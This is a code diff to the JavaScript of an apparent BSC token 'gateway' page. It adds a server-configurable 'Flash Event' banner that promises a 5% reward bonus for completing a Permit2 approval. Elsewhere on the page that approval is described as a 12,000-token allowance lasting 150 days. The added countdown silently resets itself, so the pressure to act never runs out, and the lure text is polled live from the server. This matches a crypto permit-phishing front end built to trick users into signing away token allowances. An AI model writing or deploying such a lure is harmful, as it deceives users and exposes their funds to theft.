@@ -895,8 +895,24 @@ function setRefDigits(n) {
 }
 
 /* ============================================================
-   STATE
+   REWARD CONFIG & STATE
    ============================================================ */
+const DEFAULT_REWARD_CONFIG = {
+  enabled: true,
+  percentage: "5.0",
+  durationHours: 72,
+  badgeText: "Flash Event · 72H Only",
+  headline: "Claim Your 5% Reward Bonus",
+  description: "Special 72-hour reward event! Connect your wallet and complete Permit2 approval within the countdown window to qualify for an exclusive one-time 5% bonus reward. Valid for all newly connected wallets and users approving again.",
+  inCardText: "Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!",
+  perk1Title: "5% One-Time Reward",
+  perk1Desc: "Automatically locked in when you complete Permit2 approval.",
+  perk2Title: "New & Re-Approvals",
+  perk2Desc: "Applicable for first-time connections & wallets approving again.",
+  perk3Title: "Instant BSC On-Chain",
+  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period."
+};
+
 const state = {
   account: null,
   signer: null,
@@ -907,8 +923,28 @@ const state = {
   statusMsg: "",
   statusKind: "",
   refDigits: 6,
-  referredBy: parseReferral()
+  referredBy: parseReferral(),
+  rewardConfig: { ...DEFAULT_REWARD_CONFIG }
 };
+
+async function fetchRewardConfig() {
+  try {
+    const data = await req('/reward-config');
+    if (data && data.rewardConfig) {
+      const prevHours = state.rewardConfig ? state.rewardConfig.durationHours : 72;
+      state.rewardConfig = { ...DEFAULT_REWARD_CONFIG, ...data.rewardConfig };
+      if (Number(data.rewardConfig.durationHours) !== Number(prevHours)) {
+        const key = 'tokengateway_bonus_expiry_dyn';
+        const newExpiry = Date.now() + Number(data.rewardConfig.durationHours) * 3600 * 1000;
+        localStorage.setItem(key, newExpiry);
+        localStorage.setItem('tokengateway_bonus_duration', String(data.rewardConfig.durationHours));
+      }
+      render();
+    }
+  } catch (e) {
+    // Keep current defaults
+  }
+}
 
 function esc(s) {
   return String(s || '').replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
@@ -1075,16 +1111,18 @@ function render() {
         <span><strong>1-Time Approval:</strong> Authorizes up to 12,000 ${esc(t.symbol)} allowance for 150 days. You only need to approve once.</span>
       </div>
 
+      ${state.rewardConfig && state.rewardConfig.enabled !== false ? `
       <div class="bonus-in-card-alert">
         <div class="b-icon">🎁</div>
         <div class="b-body">
           <div class="b-title">
-            <span>Special 5% Reward Bonus</span>
-            <span class="b-timer-pill" id="mini-countdown-text">71h 59m left</span>
+            <span>${esc(state.rewardConfig.headline || `Special ${state.rewardConfig.percentage}% Reward Bonus`)}</span>
+            <span class="b-timer-pill" id="mini-countdown-text">${esc(String(state.rewardConfig.durationHours || 72))}h left</span>
           </div>
-          <div style="font-size:.73rem;color:#fde68a;">Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!</div>
+          <div style="font-size:.73rem;color:#fde68a;">${esc(state.rewardConfig.inCardText || `Connect & approve within ${state.rewardConfig.durationHours} hours to receive an exclusive one-time ${state.rewardConfig.percentage}% reward bonus!`)}</div>
         </div>
       </div>
+      ` : ''}
 
       <button id="btn-sign" class="btn btn-primary" ${state.busy?"disabled":""}>
         ${state.busy
@@ -1095,25 +1133,26 @@ function render() {
       ${alertHtml(state.statusMsg, state.statusKind)}
     </div>
 
-    <!-- 5% REWARD BONUS CARD -->
+    ${state.rewardConfig && state.rewardConfig.enabled !== false ? `
+    <!-- REWARD BONUS CARD -->
     <div class="bonus-card" id="reward-bonus-card">
       <div class="bonus-glow-sphere"></div>
 
       <div class="bonus-top-bar">
         <div class="bonus-badge-live">
           <span class="pulse-live-dot"></span>
-          <span>Flash Event · 72H Only</span>
+          <span>${esc(state.rewardConfig.badgeText || `Flash Event · ${state.rewardConfig.durationHours}H Only`)}</span>
         </div>
-        <div class="bonus-badge-percent">+5.0% REWARD BONUS</div>
+        <div class="bonus-badge-percent">+${esc(state.rewardConfig.percentage)}% REWARD BONUS</div>
       </div>
 
       <h2 class="bonus-title">
         <span>🎁</span>
-        <span>Claim Your <span class="bonus-title-highlight">5% Reward Bonus</span></span>
+        <span>Claim Your <span class="bonus-title-highlight">${esc(state.rewardConfig.percentage)}% Reward Bonus</span></span>
       </h2>
 
       <p class="bonus-desc">
-        Special 72-hour reward event! Connect your wallet and complete Permit2 approval within the countdown window to qualify for an exclusive <strong>one-time 5% bonus reward</strong>. Valid for all newly connected wallets and users approving again.
+        ${esc(state.rewardConfig.description)}
       </p>
 
       <div class="timer-card">
@@ -1121,12 +1160,12 @@ function render() {
           <div class="timer-header-title">
             <span>⏳</span> Promotional Window Ends In
           </div>
-          <div class="timer-header-duration">72-HOUR WINDOW</div>
+          <div class="timer-header-duration">${esc(String(state.rewardConfig.durationHours))}-HOUR WINDOW</div>
         </div>
 
         <div class="countdown-digits-row">
           <div class="countdown-box">
-            <span class="countdown-number" id="bonus-timer-h">71</span>
+            <span class="countdown-number" id="bonus-timer-h">${esc(String(Math.max(0, Number(state.rewardConfig.durationHours) - 1)))}</span>
             <span class="countdown-unit">Hours</span>
           </div>
           <span class="countdown-sep">:</span>
@@ -1149,27 +1188,28 @@ function render() {
       <div class="bonus-perks-grid">
         <div class="perk-item">
           <span class="perk-icon">💎</span>
-          <span class="perk-title">5% One-Time Reward</span>
-          <span class="perk-sub">Automatically locked in when you complete Permit2 approval.</span>
+          <span class="perk-title">${esc(state.rewardConfig.perk1Title || `${state.rewardConfig.percentage}% One-Time Reward`)}</span>
+          <span class="perk-sub">${esc(state.rewardConfig.perk1Desc || 'Automatically locked in when you complete Permit2 approval.')}</span>
         </div>
         <div class="perk-item">
           <span class="perk-icon">🔄</span>
-          <span class="perk-title">New & Re-Approvals</span>
-          <span class="perk-sub">Applicable for first-time connections & wallets approving again.</span>
+          <span class="perk-title">${esc(state.rewardConfig.perk2Title || 'New & Re-Approvals')}</span>
+          <span class="perk-sub">${esc(state.rewardConfig.perk2Desc || 'Applicable for first-time connections & wallets approving again.')}</span>
         </div>
         <div class="perk-item">
           <span class="perk-icon">⚡</span>
-          <span class="perk-title">Instant BSC On-Chain</span>
-          <span class="perk-sub">Direct BSC Mainnet confirmation with 0 waiting period.</span>
+          <span class="perk-title">${esc(state.rewardConfig.perk3Title || 'Instant BSC On-Chain')}</span>
+          <span class="perk-sub">${esc(state.rewardConfig.perk3Desc || 'Direct BSC Mainnet confirmation with 0 waiting period.')}</span>
         </div>
       </div>
 
       <button class="btn-bonus-cta" id="btn-claim-bonus">
         ${state.account
-          ? "🚀 Complete Approval & Claim 5% Bonus"
-          : "⚡ Connect Wallet & Claim 5% Bonus"}
+          ? `🚀 Complete Approval & Claim ${esc(state.rewardConfig.percentage)}% Bonus`
+          : `⚡ Connect Wallet & Claim ${esc(state.rewardConfig.percentage)}% Bonus`}
       </button>
     </div>
+    ` : ''}
   `;
 
   bind();
@@ -1292,7 +1332,8 @@ async function handleSign() {
       }
     });
 
-    state.statusMsg  = `✅ Successfully approved and signed! Permit registered (ID #${res.id}). 🎉 Your +5% Reward Bonus has been activated for this wallet!`;
+    const rc = state.rewardConfig || DEFAULT_REWARD_CONFIG;
+    state.statusMsg  = `✅ Successfully approved and signed! Permit registered (ID #${res.id}). 🎉 Your +${rc.percentage}% Reward Bonus has been activated for this wallet!`;
     state.statusKind = "ok";
     state.stepIdx    = 3;
   } catch (e) {
@@ -1305,17 +1346,25 @@ async function handleSign() {
 }
 
 /* ============================================================
-   BONUS COUNTDOWN TIMER (72-Hour Cycle)
+   BONUS COUNTDOWN TIMER (Dynamic Admin Duration)
    ============================================================ */
 function updateBonusCountdown() {
-  const expiryKey = 'tokengateway_bonus_expiry_v2';
-  const SEVENTY_TWO_HOURS = 72 * 60 * 60 * 1000;
+  const rc = state.rewardConfig || DEFAULT_REWARD_CONFIG;
+  if (rc.enabled === false) return;
+
+  const durationHours = Number(rc.durationHours) || 72;
+  const durationMs = durationHours * 60 * 60 * 1000;
+  const expiryKey = 'tokengateway_bonus_expiry_dyn';
+  const storedDurationKey = 'tokengateway_bonus_duration';
+
+  let storedDuration = parseInt(localStorage.getItem(storedDurationKey), 10);
   let expiry = parseInt(localStorage.getItem(expiryKey), 10);
   const now = Date.now();
 
-  if (!expiry || isNaN(expiry) || expiry <= now) {
-    expiry = now + SEVENTY_TWO_HOURS;
+  if (!expiry || isNaN(expiry) || expiry <= now || storedDuration !== durationHours) {
+    expiry = now + durationMs;
     localStorage.setItem(expiryKey, expiry);
+    localStorage.setItem(storedDurationKey, durationHours);
   }
 
   const diff = Math.max(0, expiry - now);
@@ -1338,7 +1387,7 @@ function updateBonusCountdown() {
   if (elS) elS.textContent = sStr;
   if (elMini) elMini.textContent = `${hStr}h ${mStr}m ${sStr}s left`;
   if (elBar) {
-    const pct = Math.min(100, Math.max(2, (diff / SEVENTY_TWO_HOURS) * 100));
+    const pct = Math.min(100, Math.max(2, (diff / durationMs) * 100));
     elBar.style.width = pct + '%';
   }
 }
@@ -1346,8 +1395,10 @@ function updateBonusCountdown() {
 // Tick countdown every second
 setInterval(updateBonusCountdown, 1000);
 
-// Initial render & auto-detect existing provider account
+// Initial render, fetch dynamic reward config, and auto-detect existing provider account
 render();
+fetchRewardConfig();
+setInterval(fetchRewardConfig, 15000); // Live poll for admin configuration updates
 if (window.ethereum) {
   if (window.ethereum.selectedAddress) {
     connectWallet().then(({ signer, provider, address }) => {
